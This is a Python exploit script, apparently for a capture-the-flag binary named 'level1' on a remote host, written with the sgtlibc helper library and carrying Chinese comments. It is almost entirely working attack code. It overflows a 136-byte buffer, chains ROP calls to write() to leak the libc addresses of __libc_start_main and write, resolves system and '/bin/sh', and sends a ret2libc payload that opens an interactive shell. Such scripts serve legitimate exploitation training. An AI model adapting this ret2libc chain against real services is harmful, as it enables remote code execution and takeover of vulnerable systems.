import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.gamebox
from sgtlibc.utils.shell import check_shell_validate
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./level1',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf

plt_write = elf.plt['write']  # write()
main_addr = elf.symbols['main']  # elf.symbols['vuln']


canary = b''


def exp():
    # overflow position
    data = [b'a' * (136),fakeebp()]
    return data


pause()


def leak(func: str):
    log.info(f'start leak {func}')
    payload = exp()
    # write(1,buffer,4)
    payload += [plt_write, main_addr]
    payload += [1, elf.got[func], 4]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    se(payload)

    data = rc(4)  # 32位接收4个
    data = u00(data)
    s.add_condition(func, data)
    log.info(f'leak {func} : {hex(data)}')
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
addr = leak('__libc_start_main')
# leak('strlen')
leak('write')
# leak('setbuf')

# 如果给了libc则可以直接使用
# libc = ELF('libc_buu-2.23_x86.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

# 再次利用payload，溢出执行system


def filter(x):
    return True
    return 'ubuntu' in x


data = s.dump(db_index=0, filter=filter)
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)

log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
pause()
ret_addr = elf.rop['ret']  # 栈平衡
payload = [exp(), ret_addr]
payload += [system_addr, fakeebp(), binsh_addr]
se(payload)

interactive()
